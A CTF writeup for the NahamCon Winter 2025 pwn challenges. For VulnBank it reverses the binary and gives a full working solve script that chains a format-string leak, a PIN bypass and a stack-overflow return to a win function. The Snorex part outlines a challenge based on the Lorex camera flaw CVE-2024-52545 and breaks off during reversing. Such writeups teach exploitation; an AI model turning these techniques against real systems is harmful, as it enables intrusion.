---
title: NahamCon Winter CTF 2025
date: 2025-12-19 17:00:00 +0000
categories: [CTF, Writeup]
tags: [pwnable]
math: true
mermaid: true
media_subpath: /assets/posts/2025-12-19-Nahamcon-Winter-25
image:
  path: preview.png
---

## NahamCon Winter CTF 2025

### Overview

This writeup covers all pwn challenges from NahamCon Winter CTF 2025. The event featured two pwnable challenges:
- VulnBank
- Snorex

### VulnBank

#### Challenge Information
- **Difficulty**: Medium
- **First Blood**: 🩸

VulnBank requires chaining multiple vulnerabilities to achieve rip control. The exploit path involves:

1. Exploiting a format string vulnerability to leak memory addresses and the authentication PIN
2. Using the leaked PIN to bypass authentication
3. Triggering a buffer overflow to redirect execution to the win function

#### Attachments

We are given a zip file which contains the necessary files needed to start the challenge.

```bash
 ~/Desktop/CTF/NahamconWinter25/VulnBank ❯ zipinfo vuln_bank
Archive:  vuln_bank.zip
Zip file size: 6117 bytes, number of entries: 4
drwxr-xr-x  3.0 unx        0 bx stor 25-Dec-15 17:35 vuln_bank/
-rw-r--r--  3.0 unx      393 tx defN 25-Dec-15 17:34 vuln_bank/Dockerfile
-rwxr-xr-x  3.0 unx      231 tx defN 25-Dec-15 17:34 vuln_bank/start.sh
-rwxr-xr-x  3.0 unx    18488 bx defN 25-Dec-15 17:34 vuln_bank/vulnbank
4 files, 19112 bytes uncompressed, 5451 bytes compressed:  71.5%
```

After unzipping here's the content of the:

- *Dockerfile*

```dockerfile
FROM ubuntu:22.04

RUN apt-get update && apt-get install -y gcc socat && rm -rf /var/lib/apt/lists/*

RUN useradd -m ctf
WORKDIR /home/ctf

COPY vulnbank .
RUN chmod +x vulnbank

ENV FLAG1="flag{now_repeat_against_remote_server}"
ENV FLAG2="flag{now_repeat_against_remote_server}"

EXPOSE 1337

USER ctf

CMD ["socat", "TCP-LISTEN:1337,reuseaddr,fork", "EXEC:./vulnbank,stderr,setsid,sigint"]

```

- *start.sh*

```bash
#!/usr/bin/env bash
set -euo pipefail

IMAGE="vulnbank"
CONTAINER="vuln-bank"

docker build -t "$IMAGE" .

docker rm -f "$CONTAINER" >/dev/null 2>&1 || true

docker run \
  --rm \
  --name "$CONTAINER" \
  -p 1337:1337 \
  "$IMAGE"
```

Nothing really much happens, it just simply builds the container and execute the challenge.

#### Program Analysis

We are given an executable *vulnbank*.

Checking the file type and enabled protections, we get the following:

```bash
 ~/Desktop/CTF/NahamconWinter25/VulnBank/vuln_bank ❯ file vulnbank
vulnbank: ELF 64-bit LSB pie executable, x86-64, version 1 (SYSV), dynamically linked, interpreter /lib64/ld-linux-x86-64.so.2, BuildID[sha1]=97f05908fa4be2a289717d0e8860851af4556db1, for GNU/Linux 3.2.0, stripped
                                                                                                                                                                                             
 ~/Desktop/CTF/NahamconWinter25/VulnBank/vuln_bank ❯ checksec vulnbank      
[*] '/home/.../Desktop/CTF/NahamconWinter25/VulnBank/vuln_bank/vulnbank'
    Arch:       amd64-64-little
    RELRO:      Full RELRO
    Stack:      No canary found
    NX:         NX enabled
    PIE:        PIE enabled
```

We are working with a *x86-64* binary which is *dynamically linked* and *stripped*.

All protections except *Stack Canary* are enabled on this binary.

Running it to get an overview of its behaviour:

```bash
 ~/Desktop/CTF/NahamconWinter25/VulnBank/vuln_bank ❯ ./vulnbank 
================================================================
=                                                              =
=                        V U L N B A N K                       =
=                                                              =
=                    "Because bugs need banks"                 =
=                                                              =
================================================================
                             _________                          
                            / _______ \                         
                           / / _____ \ \                        
                          / / /     \ \ \                       
                         / / /  VBNK \ \ \                      
                        / / /_________\ \ \                     
                       /_/_____________\_\_\                    
                         |  [ 0 ] [ 1 ]  |                      
                         |  [ 2 ] [ 3 ]  |                      
                         |  [ 4 ] [ 5 ]  |                      
                         |  [ 6 ] [ 7 ]  |                      
                         |  [ 8 ] [ 9 ]  |                      
                         |_______________|                      

Please insert your card into the VulnBank terminal...
Card detected. Reading chip...

================================================================
                       VULNBANK SECURE LOGIN                    
================================================================
This terminal uses a 6 digit PIN for access.
Repeated failed attempts may cause your card to be retained.

Enter 6 digit PIN: 1234
1234
Incorrect PIN.

Enter 6 digit PIN: 12
12
Incorrect PIN.

Enter 6 digit PIN: 222
222
Incorrect PIN.

Too many incorrect attempts.
Your card has been retained by this VulnBank terminal.
Please contact support.

```

So it expects a 6 digits pin, and we have only 3 trials, we can make an assumption that on giving it the right pin we will get logged into the vulnbank portal.

In order to confirm that and identify the vulnerabiities, we need to reverse engineer it.

#### Reversing 1

Here's the main function:

```c
__int64 __fastcall main(int a1, char **a2, char **a3)
{
  setvbuf(stdin, 0LL, 2, 0LL);
  setvbuf(stdout, 0LL, 2, 0LL);
  setvbuf(stderr, 0LL, 2, 0LL);
  show_banner();
  if ( (unsigned int)validate_pin() )
  {
    sub_19DD();
    puts(byte_24C9);
    puts("Session ended.");
  }
  return 0LL;
}
```

So it disables buffering on *stdin, stdout, stderr*.

After that it prints the *banner* and calls the function which handles receiving & validating the pin.

```c
__int64 generate_random_pin()
{
  unsigned int buf; // [rsp+Ch] [rbp-14h] BYREF
  ssize_t v2; // [rsp+10h] [rbp-10h]
  int fd; // [rsp+1Ch] [rbp-4h]

  fd = open("/dev/urandom", 0);
  if ( fd < 0 )
  {
    perror("open");
    exit(1);
  }
  v2 = read(fd, &buf, 4uLL);
  if ( v2 != 4 )
  {
    perror("read");
    close(fd);
    exit(1);
  }
  close(fd);
  return buf % 0xDBBA0 + 100000;
}

__int64 validate_pin()
{
  char s[268]; // [rsp+0h] [rbp-130h] BYREF
  int v2; // [rsp+10Ch] [rbp-24h]
  size_t pin_len; // [rsp+110h] [rbp-20h]
  char *v4; // [rsp+118h] [rbp-18h]
  int v5; // [rsp+124h] [rbp-Ch]
  unsigned int attempts; // [rsp+128h] [rbp-8h]
  unsigned int random_pin; // [rsp+12Ch] [rbp-4h]

  random_pin = 0;
  attempts = 0;
  v5 = 0;
  show_prompt();
  while ( 1 )
  {
    if ( attempts > 2 )
    {
      puts("Too many incorrect attempts.");
      puts("Your card has been retained by this VulnBank terminal.");
      puts("Please contact support.");
      return 0LL;
    }
    printf("Enter 6 digit PIN: ");
    fflush(stdout);
    if ( !fgets(s, 256, stdin) )
      return 0LL;
    pin_len = strlen(s);
    if ( pin_len && s[pin_len - 1] == 10 )
      s[pin_len - 1] = 0;
    if ( v5 || attempts )
    {
      if ( !v5 )
      {
        random_pin = generate_random_pin();
        v5 = 1;
      }
      printf(s, random_pin);
      puts(byte_24C9);
    }
    else
    {
      printf(s);
      puts(byte_24C9);
      random_pin = generate_random_pin();
      v5 = 1;
    }
    if ( !s[0] )
    {
      puts("Empty input is not a valid PIN.");
      ++attempts;
      goto LABEL_22;
    }
    v2 = atoi(s);
    if ( v2 == random_pin )
    {
      if ( attempts )
        break;
    }
    puts("Incorrect PIN.");
    ++attempts;
LABEL_22:
    puts(byte_24C9);
  }
  puts(byte_24C9);
  printf("Welcome back, VulnBank customer #%06u.\n", random_pin % 0xF4240);
  puts(byte_24C9);
  v4 = getenv("FLAG1");
  if ( !v4 || !*v4 )
    v4 = "flag{now_repeat_against_remote_server}";
  printf("Authentication flag: %s\n", v4);
  return 1LL;
}
```

- It initializes the *pin & attempt* to null
- It enters a *while loop* and once *attempt* is greater than *2*, it breaks
- It receives the *PIN* and null terminates the string
- If *v5* or *attempts* isn't null it enters another block of code which does this:
    - If *v5* is null, it generates a new random pin and updates *v5* to *1*
    - Else if the condition isn't met then it calls *printf* on the *pin* string
- If any of the condition isn't meet (*v5* and attempts are zero) it calls *printf* on the *pin* string then generates a random pin
- If the first byte of the string is null, it goes to the start of the while loop
- Our pin string is converted to an integer and compared with the generated pin, if it matches and attempts isn't null it breaks out of the loop else it prints the error message and increments attempts by 1
- Outside the while loop, it reads the environment variable *FLAG1* and prints it out

So in order to get the first flag we simply need to get the correct pin which was randomly generated.

#### Exploitation 1

The vulnerability is a format string bug, when it prints the provided pin, it doesn't use a format specifier leading to this vuln.

The goal is obvious:
- Since we have 3 attempts
- Use the first one to basically let the pin get initialized because we know that at the second stage it's going to reuse the first pin since *v5* isn't null.
- Use the second stage to leak the pin
- Third stage to bypass the check and get logged in

One thing to note is also this:

```c
printf(s, random_pin);
```

We'll use this during the second stage to easily leak the *pin*

Since *random_pin* is used as the second parameter, we can use the format specifier `%2$d` to leak the *dword* in `rsi`

Here's the solve:

```python
def solve():

    io.sendlineafter(b":", b"junk")
    io.sendlineafter(b":", b"%2$d")
    pin = io.recvline().split(b" ")[1]
    pin = int(pin)
    io.sendline(str(pin).encode())

    io.interactive()
```

Running it works!

```bash
 ~/Desktop/CTF/NahamconWinter25/VulnBank/vuln_bank ❯ python3 solve.py
[*] '/home/.../Desktop/CTF/NahamconWinter25/VulnBank/vuln_bank/vulnbank'
    Arch:       amd64-64-little
    RELRO:      Full RELRO
    Stack:      No canary found
    NX:         NX enabled
    PIE:        PIE enabled
[+] Starting local process '/home/.../Desktop/CTF/NahamconWinter25/VulnBank/vuln_bank/vulnbank': pid 218277
[*] Switching to interactive mode
Incorrect PIN.

Enter 6 digit PIN: 689344

Welcome back, VulnBank customer

Authentication flag: flag{now_repeat_against_remote_server}

================================================================
                         VULNBANK MAIN MENU                     
================================================================
Your balance, your choices, our slightly buzzing hardware.

Current available balance: £1337

  [1] View balance
  [2] Deposit cash
  [3] Withdraw cash
  [4] View recent activity
  [9] Eject card and exit

Select option: 
```

Now we need to do the second part which is getting the *FLAG2*.

#### Reversing 2

Moving on to the next step, we now get authenticated and can reach the next function.

Here's the decompilation:

```c
void vulnbank_portal()
{
  char s[128]; // [rsp+0h] [rbp-B0h] BYREF
  __int64 v1; // [rsp+80h] [rbp-30h]
  __int64 v2; // [rsp+88h] [rbp-28h]
  int v3; // [rsp+94h] [rbp-1Ch]
  size_t v4; // [rsp+98h] [rbp-18h]
  int v5; // [rsp+A4h] [rbp-Ch]
  __int64 v6; // [rsp+A8h] [rbp-8h]

  v6 = 1337LL;
  v5 = 1;
  while ( v5 )
  {
    sub_13D9();
    printf(aCurrentAvailab, v6);
    puts(byte_24C9);
    sub_143A();
    if ( !fgets(s, 128, stdin) )
      break;
    v4 = strlen(s);
    if ( v4 && s[v4 - 1] == 10 )
      s[v4 - 1] = 0;
    v3 = atoi(s);
    switch ( v3 )
    {
      case 1:
        puts(byte_24C9);
        puts("----------------------------------------------------------------");
        puts("                        ACCOUNT BALANCE                         ");
        puts("----------------------------------------------------------------");
        printf(aAvailableFunds, v6);
        puts("Savings goal:    undefined.");
        puts("Financial stress: high.");
        puts("----------------------------------------------------------------");
        break;
      case 2:
        puts(byte_24C9);
        puts("----------------------------------------------------------------");
        puts("                          DEPOSIT CASH                          ");
        puts("----------------------------------------------------------------");
        printf(aEnterAmountToD);
        fflush(stdout);
        if ( !fgets(s, 128, stdin) )
          return;
        v1 = strtol(s, 0LL, 10);
        if ( v1 <= 0 )
          goto LABEL_11;
        v6 += v1;
        printf(aDeposited, v1);
        break;
      case 3:
        puts(byte_24C9);
        puts("----------------------------------------------------------------");
        puts("                          WITHDRAW CASH                         ");
        puts("----------------------------------------------------------------");
        printf(aEnterAmountToW);
        fflush(stdout);
        if ( !fgets(s, 128, stdin) )
          return;
        v2 = strtol(s, 0LL, 10);
        if ( v2 <= 0 )
        {
LABEL_11:
          puts("Invalid amount.");
        }
        else if ( v2 <= v6 )
        {
          v6 -= v2;
          printf(aPleaseCollectY, v2);
        }
        else
        {
          puts("Transaction declined: insufficient funds.");
        }
        break;
      case 4:
        puts(byte_24C9);
        puts("----------------------------------------------------------------");
        puts("                         RECENT ACTIVITY                        ");
        puts("----------------------------------------------------------------");
        puts(a1ContactlessPa);
        puts(a2OnlinePurchas);
        puts(a3CashWithdrawa);
        puts("----------------------------------------------------------------");
        break;
      default:
        if ( v3 )
        {
          if ( v3 == 9 )
          {
            puts(byte_24C9);
            puts("Ejecting card...");
            puts("Please take your card.");
            puts("Thank you for using VulnBank.");
            v5 = 0;
          }
          else
          {
            puts(byte_24C9);
            puts("Unrecognized selection. The keypad beeps in confusion.");
          }
        }
        else
        {
          sub_1659();
        }
        break;
    }
  }
}
```

This function really doesn't do much and here's the important thing to work on:

```c
      default:
        if ( v3 )
        {
          if ( v3 == 9 )
          {
            puts(byte_24C9);
            puts("Ejecting card...");
            puts("Please take your card.");
            puts("Thank you for using VulnBank.");
            v5 = 0;
          }
          else
          {
            puts(byte_24C9);
            puts("Unrecognized selection. The keypad beeps in confusion.");
          }
        }
        else
        {
          sub_1659();
        }
        b
```

Basically if *v3* which is the choice we provided is zero it calls the function *sub_1659*

There's no switch case that handles *0*, looking at the decompilation of the function we get this:

```c
int sub_1659()
{
  _BYTE buf[72]; // [rsp+0h] [rbp-50h] BYREF
  ssize_t v2; // [rsp+48h] [rbp-8h]

  puts(byte_24C9);
  puts("================================================================");
  puts("                     VULNBANK SERVICE TERMINAL                  ");
  puts("================================================================");
  puts("Service channel open.");
  puts("Processing maintenance request from keypad interface.");
  puts(byte_24C9);
  printf("maintenance> ");
  fflush(stdout);
  v2 = read(0, buf, 0x80uLL);
  if ( v2 <= 0 )
    return puts(byte_24C9);
  if ( buf[v2 - 1] == 10 )
    buf[v2 - 1] = 0;
  return puts("Request queued for processing.");
}
```

There's also a win function at address offset *0x1575* which has no reference call to it, hence our goal is here.

```c
void __noreturn sub_1575()
{
  const char *s; // [rsp+8h] [rbp-8h]

  puts(byte_24C9);
  puts("================================================================");
  puts("                     VULNBANK MAINTENANCE MODE                  ");
  puts("================================================================");
  puts("Technician override accepted.");
  puts("Bypassing customer safeguards, draining internal reserves...");
  puts(byte_24C9);
  s = getenv("FLAG2");
  if ( !s || !*s )
    s = "flag{now_repeat_against_remote_server}";
  puts(s);
  puts(byte_24C9);
  puts("All internal cash reserves have been transferred to this session.");
  puts("This incident will definitely not be logged. Probably.");
  exit(0);
}
```

#### Exploitation 2

The vulnerability is yet again obvious, we have a buffer overflow because it reads in at most *0x80* bytes into a buffer that can only hold up *72* bytes of data leading to a *56* bytes overflow.

With this overflow we simply need to overwrite the return address to that of the win function.

In order to do that we need leaks, specifically pie leak.

This is easy to accomplish using the initial format string bug discovered so here's the new strategy:
- First stage leak pie
- Second stage leak pin
- Third stage authenticate
- Exploit overflow to call the win function

To leak pie we need the offset of where an elf section address is on the stack at the call to *printf*.

Here's the stack layout:

```bash
$rcx+ 0x7ffddc956a30|+0x0000|+000: 0x0000007024353425 ('%45$p'?)
      0x7ffddc956a38|+0x0008|+001: 0x00007feb34ef86ad <__syscall_cancel+0xd>  ->  0xf0003dd06348595a
      0x7ffddc956a40|+0x0010|+002: 0x0000000000000001
      0x7ffddc956a48|+0x0018|+003: 0x00007feb34ef86ad <__syscall_cancel+0xd>  ->  0xf0003dd06348595a
      0x7ffddc956a50|+0x0020|+004: 0x0000000000000001
      0x7ffddc956a58|+0x0028|+005: 0x00007feb34f6d936 <write+0x16>  ->  0x441f0fc318c48348
      0x7ffddc956a60|+0x0030|+006: 0x0000000000000001
      0x7ffddc956a68|+0x0038|+007: 0x00007feb34f6d936 <write+0x16>  ->  0x441f0fc318c48348
      0x7ffddc956a70|+0x0040|+008: 0x0000000000000001
      0x7ffddc956a78|+0x0048|+009: 0x00007feb34ef45f5 <_IO_file_write+0x25>  ->  0xc329482678c08548
      0x7ffddc956a80|+0x0050|+010: 0x0000000000000002
      0x7ffddc956a88|+0x0058|+011: 0x00007feb34ef45f5 <_IO_file_write+0x25>  ->  0xc329482678c08548
      0x7ffddc956a90|+0x0060|+012: 0x00007feb3504efd0 <_IO_file_jumps>  ->  0x0000000000000000
      0x7ffddc956a98|+0x0068|+013: 0x00007feb350515c0 <_IO_2_1_stdout_>  ->  0x00000000fbad2887
      0x7ffddc956aa0|+0x0070|+014: 0x00007feb3504efd0 <_IO_file_jumps>  ->  0x0000000000000000
      0x7ffddc956aa8|+0x0078|+015: 0x00007feb35051643 <_IO_2_1_stdout_+0x83>  ->  0x0527b0000000000a
      0x7ffddc956ab0|+0x0080|+016: 0x0000000000000001
      0x7ffddc956ab8|+0x0088|+017: 0x00007feb34ef28d2 <new_do_write+0x52>  ->  0x4800000080bbb70f
      0x7ffddc956ac0|+0x0090|+018: 0x0000000000000001
      0x7ffddc956ac8|+0x0098|+019: 0x000000000000000a
      0x7ffddc956ad0|+0x00a0|+020: 0x00007feb350515c0 <_IO_2_1_stdout_>  ->  0x00000000fbad2887
      0x7ffddc956ad8|+0x00a8|+021: 0x000056272cf87020 <stdout>  ->  0x00007feb350515c0 <_IO_2_1_stdout_>  ->  0x00000000fbad2887
      0x7ffddc956ae0|+0x00b0|+022: 0x00007feb3504efd0 <_IO_file_jumps>  ->  0x0000000000000000
      0x7ffddc956ae8|+0x00b8|+023: 0x00007feb34ef36f9 <_IO_do_write+0x19>  ->  0x0fc0950f5bc33948
      0x7ffddc956af0|+0x00c0|+024: 0x00007feb350515c0 <_IO_2_1_stdout_>  ->  0x00000000fbad2887
      0x7ffddc956af8|+0x00c8|+025: 0x00007feb34ef3c33 <_IO_file_overflow+0x103>  ->  0xffff53850ffff883
      0x7ffddc956b00|+0x00d0|+026: 0x0000000000000000
      0x7ffddc956b08|+0x00d8|+027: 0x000056272cf844c9  ->  0x5000000000000000
      0x7ffddc956b10|+0x00e0|+028: 0x00007feb350515c0 <_IO_2_1_stdout_>  ->  0x00000000fbad2887
      0x7ffddc956b18|+0x00e8|+029: 0x00007feb34ee977a <puts+0x1da>  ->  0xfffeb6850ffff883
      0x7ffddc956b20|+0x00f0|+030: 0x00007feb350514e0 <_IO_2_1_stderr_>  ->  0x00000000fbad2087
      0x7ffddc956b28|+0x00f8|+031: 0x00007feb34ee9e70 <setvbuf+0x120>  ->  0x1945038b01f88348
      0x7ffddc956b30|+0x0100|+032: 0x00007ffddc956c88  ->  0x00007ffddc957f92  ->  0x616d2f656d6f682f '/home/../Desktop/CTF/NahamconWinter25/VulnBank/vuln_bank/vulnb[...]'  <-  $rbx
      0x7ffddc956b38|+0x0108|+033: 0x00007ffddc956b60  ->  0x00007ffddc956b70  ->  0x0000000000000001  <-  $rbp
      0x7ffddc956b40|+0x0110|+034: 0x0000000000000006
      0x7ffddc956b48|+0x0118|+035: 0x00007ffddc956c98  ->  0x00007ffddc957fd6  ->  0x424746524f4c4f43 'COLORFGBG=15;0'  <-  $r13
      0x7ffddc956b50|+0x0120|+036: 0x00000000350b7000
      0x7ffddc956b58|+0x0128|+037: 0x0000000000000000
$rbp  0x7ffddc956b60|+0x0130|+038: 0x00007ffddc956b70  ->  0x0000000000000001
      0x7ffddc956b68|+0x0138|+039: 0x000056272cf83ebb  ->  0x000000b80775c085  <-  retaddr[1]
      0x7ffddc956b70|+0x0140|+040: 0x0000000000000001
      0x7ffddc956b78|+0x0148|+041: 0x00007feb34e92ca8 <__libc_start_call_main+0x78>  ->  0xe800018691e8c789  <-  retaddr[2]
      0x7ffddc956b80|+0x0150|+042: 0x00007ffddc956c70  ->  0x00007ffddc956c78  ->  0x0000000000000038
      0x7ffddc956b88|+0x0158|+043: 0x000056272cf83e49  ->  0xdc058b48e5894855
      0x7ffddc956b90|+0x0160|+044: 0x000000012cf82040
      0x7ffddc956b98|+0x0168|+045: 0x00007ffddc956c88  ->  0x00007ffddc957f92  ->  0x616d2f656d6f682f '/home/.../Desktop/CTF/NahamconWinter25/VulnBank/vuln_bank/vulnb[...]'  <-  $rbx
      0x7ffddc956ba0|+0x0170|+046: 0x00007ffddc956c88  ->  0x00007ffddc957f92  ->  0x616d2f656d6f682f '/home/.../Desktop/CTF/NahamconWinter25/VulnBank/vuln_bank/vulnb[...]'  <-  $rbx
      0x7ffddc956ba8|+0x0178|+047: 0x9c641817c2f4492e
      0x7ffddc956bb0|+0x0180|+048: 0x0000000000000000
      0x7ffddc956bb8|+0x0188|+049: 0x00007ffddc956c98  ->  0x00007ffddc957fd6  ->  0x424746524f4c4f43 'COLORFGBG=15;0'  <-  $r13
      0x7ffddc956bc0|+0x0190|+050: 0x00007feb350b7000 <_rtld_global>  ->  0x00007feb350b8310  ->  0x000056272cf82000  ->  ...  <-  $r14
      0x7ffddc956bc8|+0x0198|+051: 0x000056272cf86d58  ->  0x000056272cf831c0  ->  0x3e7d3d80fa1e0ff3  <-  $r15
      0x7ffddc956bd0|+0x01a0|+052: 0x639fa13d15f6492e
      0x7ffddc956bd8|+0x01a8|+053: 0x63b271c59a36492e
      0x7ffddc956be0|+0x01b0|+054: 0x0000000000000000
      0x7ffddc956be8|+0x01b8|+055: 0x0000000000000000
      0x7ffddc956bf0|+0x01c0|+056: 0x0000000000000000
/tmp/gef/gef_print-20251220-135105-ybn32pv1.txt
```

I opted for this address, as it's more reliable to leak the return address than some random pie address on the stack.

```bash
      0x7ffddc956b68|+0x0138|+039: 0x000056272cf83ebb  ->  0x000000b80775c085  <-  retaddr[1]
```

With this we can calculate the base address and exploit the overflow!

Here's my solve script:

```python
#!/usr/bin/env python3
# -*- coding: utf-8 -*-
from pwn import *

exe = context.binary = ELF('vulnbank')
context.terminal = ['xfce4-terminal', '--title=GDB', '--zoom=0', '--geometry=128x50+1100+0', '-e']
context.log_level = 'info'

def start(argv=[], *a, **kw):
    if args.GDB:
        return gdb.debug([exe.path] + argv, gdbscript=gdbscript, *a, **kw)
    elif args.REMOTE: 
        return remote(sys.argv[1], sys.argv[2], *a, **kw)
    else:
        return process([exe.path] + argv, *a, **kw)

gdbscript = '''
init-gef
brva 0x1823
continue
'''.format(**locals())

#===========================================================
#                    EXPLOIT GOES HERE
#===========================================================

def init():
    global io

    io = start()

def solve():

    io.sendlineafter(b":", b"%45$p")
    leak = io.recvline().split(b" ")[1]
    exe.address = int(leak, 16) - 0x1ebb
    info("elf base: %#x", exe.address)

    io.sendlineafter(b":", b"%2$d")
    pin = io.recvline().split(b" ")[1]
    pin = int(pin)
    io.sendline(str(pin).encode())

    io.sendlineafter(b":", b"0")
    offset = 72+8+8
    payload = flat({
        offset: [
            exe.address + 0x001575
        ]
    })

    io.sendline(payload)
    io.interactive()


def main():
    
    init()
    solve()
    

if __name__ == '__main__':
    main()

```

Running it works!

```bash
 ~/Desktop/CTF/NahamconWinter25/VulnBank/vuln_bank ❯ python3 solve.py
[*] '/home/.../Desktop/CTF/NahamconWinter25/VulnBank/vuln_bank/vulnbank'
    Arch:       amd64-64-little
    RELRO:      Full RELRO
    Stack:      No canary found
    NX:         NX enabled
    PIE:        PIE enabled
[+] Starting local process '/home/.../Desktop/CTF/NahamconWinter25/VulnBank/vuln_bank/vulnbank': pid 259469
[*] elf base: 0x55b6b5302000
[*] Switching to interactive mode
 [*] Process '/home/.../Desktop/CTF/NahamconWinter25/VulnBank/vuln_bank/vulnbank' stopped with exit code 0 (pid 259469)
927478

Welcome back, VulnBank customer

Authentication flag: flag{now_repeat_against_remote_server}

================================================================
                         VULNBANK MAIN MENU                     
================================================================
Your balance, your choices, our slightly buzzing hardware.

Current available balance: £1337

  [1] View balance
  [2] Deposit cash
  [3] Withdraw cash
  [4] View recent activity
  [9] Eject card and exit

Select option: 
================================================================
                     VULNBANK SERVICE TERMINAL                  
================================================================
Service channel open.
Processing maintenance request from keypad interface.

maintenance> Request queued for processing.

================================================================
                     VULNBANK MAINTENANCE MODE                  
================================================================
Technician override accepted.
Bypassing customer safeguards, draining internal reserves...

flag{now_repeat_against_remote_server}

All internal cash reserves have been transferred to this session.
This incident will definitely not be logged. Probably.
[*] Got EOF while reading in interactive
```

And we get the flag 😜

### Snorex

#### Challenge Information
- **Difficulty**: Advanced
- **Based on**: [LorexExploit](https://github.com/sfewer-r7/LorexExploit?tab=readme-ov-file)

This challenge is based on *CVE-2024-52545*, which affects the IQ Service running on TCP port 9876. The vulnerability allows an unauthenticated attacker to perform out-of-bounds heap reads. According to the CVE description, this issue was patched in firmware version 2.800.0000000.8.R.20241111.

The exploit chain combines two techniques to achieve authentication bypass:

1. Heap feng shui to manipulate heap layout and position target data
2. Unauthenticated out-of-bounds heap read to leak the device secret code
3. Authentication using leaked secret

#### Program Analysis

We are given a *Dockerfile*

```dockerfile
FROM debian:bookworm-slim

RUN apt-get update && apt-get install -y gcc make libc6-dev libssl-dev && rm -rf /var/lib/apt/lists/*

WORKDIR /app

COPY snorex_sonia /app/

RUN chmod +x snorex_sonia

ENV SNOREX_SERIAL=FAKEZ-2K-CAM01
ENV SNOREX_MAC=AB:12:4D:7C:20:10
ENV FLAG=flag{now_repeat_against_remote_server}

EXPOSE 3500

CMD ["./snorex_sonia"]
```

A *start.sh* file:

```bash
#!/usr/bin/env bash
set -euo pipefail

IMAGE="snorex"
CONTAINER="snorex"

docker build -t "$IMAGE" .

docker rm -f "$CONTAINER" >/dev/null 2>&1 || true

docker run \
  --rm \
  --name "$CONTAINER" \
  -p 3500:3500 \
  "$IMAGE"  
```

And the challenge file *snorex_sonic*

Looking at the filetype and protections enabled we get this:

```bash
 ~/Desktop/CTF/NahamconWinter25/Snorex ❯ file snorex_sonia 
snorex_sonia: ELF 64-bit LSB pie executable, x86-64, version 1 (SYSV), dynamically linked, interpreter /lib64/ld-linux-x86-64.so.2, BuildID[sha1]=099466942a10f6753c1177645a57c127b73c86bb, for GNU/Linux 3.2.0, with debug_info, not stripped
                                                                                                                                                                                             
 ~/Desktop/CTF/NahamconWinter25/Snorex ❯ checksec snorex_sonia 
[*] '/home/../Desktop/CTF/NahamconWinter25/Snorex/snorex_sonia'
    Arch:       amd64-64-little
    RELRO:      Full RELRO
    Stack:      Canary found
    NX:         NX enabled
    PIE:        PIE enabled
    Stripped:   No
    Debuginfo:  Yes
```

So the binary is not stripped and it has debug info which makes reversing less painful 

All protections are also enabled

We also see something interesting in the *Dockerfile*, it sets some environment variable:

```bash
ENV SNOREX_SERIAL=FAKEZ-2K-CAM01
ENV SNOREX_MAC=AB:12:4D:7C:20:10
ENV FLAG=flag{now_repeat_against_remote_server}
```

Running the binary we get this:

```bash
 ~/Desktop/CTF/NahamconWinter25/Snorex ❯ ./snorex_sonia 
[snorex] rpc port=3500
[rpc] listening on 3500
```

It seems to listen on port *3500*, connecting to that we don't get much

```bash
 ~/Desktop/CTF/NahamconWinter25/Snorex ❯ nc localhost 3500                                          
asdf
pe                                                                                                                                                                                           
 ~/Desktop/CTF/NahamconWinter25/Snorex ❯ nc localhost 3500
pew
hi
leoo
```

#### Reversing

Loading the binary up in IDA, here's the main function

```c
int __fastcall main(int argc, const char **argv, const char **envp)
{
  int v3; // ebx
  __pid_t v4; // eax
  pthread_t th; // [rsp+0h] [rbp-20h] BYREF
  unsigned __int64 v7; // [rsp+8h] [rbp-18h]

  v7 = __readfsqword(0x28u);
  load_config();
  v3 = time(0LL);
  v4 = getpid();
  srand(v4 ^ v3 ^ (2 * g_cfg.ts));
  if ( pthread_create(&th, 0LL, (void *(*)(void *))rpc_server_thread, 0LL) )
  {
    perror("pthread_create");
    return 1;
  }
  else
  {
    pthread_join(th, 0LL);
    return 0;
  }
}
```

We see the main function first calls the `load_config` function:

```c
void __cdecl load_config()
{
  char *s; // [rsp+0h] [rbp-10h]
  char *m; // [rsp+8h] [rbp-8h]

  g_cfg.port = 3500;
  s = getenv("SNOREX_SERIAL");
  if ( !s || !*s )
    s = "FAKEZ-2K-CAM01";
  strncpy(g_cfg.serial, s, 0xFuLL);
  m = getenv("SNOREX_MAC");
  if ( !m || !*m )
    m = "AB:12:4D:7C:20:10";
  strncpy(g_cfg.mac, m, 0x11uLL);
  pthread_mutex_lock(&g_usr_mutex);
  g_usr_ctx.encrypt_data = usrMgr_getEncryptDataStr();
  pthread_mutex_unlock(&g_usr_mutex);
  fprintf(stderr, "[snorex] rpc port=%u\n", g_cfg.port);
}
```

This updates the `g_cfg` struct fields to the necessary values

```c
00000000 struct __attribute__((aligned(2))) SONIA_CONFIG // sizeof=0x38
00000000 {                                       // XREF: .bss:g_cfg/r
00000000     uint16_t port;                      // XREF: rpc_server_thread+B2/r
00000000                                         // rpc_server_thread:loc_2076/r ...
00000002     char serial[16];                    // XREF: usrMgr_getEncryptDataStr+103/o
00000002                                         // load_config+4D/o
00000012     char mac[18];                       // XREF: usrMgr_getEncryptDataStr+F9/o
00000012                                         // load_config+98/o
00000024     uint32_t ts;                        // XREF: refresh_secrets+13/w
00000024                                         // refresh_secrets:loc_152C/r ...
00000028     uint8_t rand_bytes[15];             // XREF: refresh_secrets+23/o
00000028                                         // refresh_secrets+5C/o ...
00000037     // padding byte
00000038 };

00000000 struct USR_MGR_CTX // sizeof=0x8
00000000 {                                       // XREF: .bss:g_usr_ctx/r
00000000     USR_MGR_ENCRYPT_DATA *encrypt_data; // XREF: PasswdFind_getAuthCode+31/r
00000000                                         // handle_auth+57/r ...
00000008 };

00000000 struct USR_MGR_ENCRYPT_DATA // sizeof=0x108
00000000 {
00000000     char tag[8];
00000008     char encrypt_str[256];
00000108 };
```

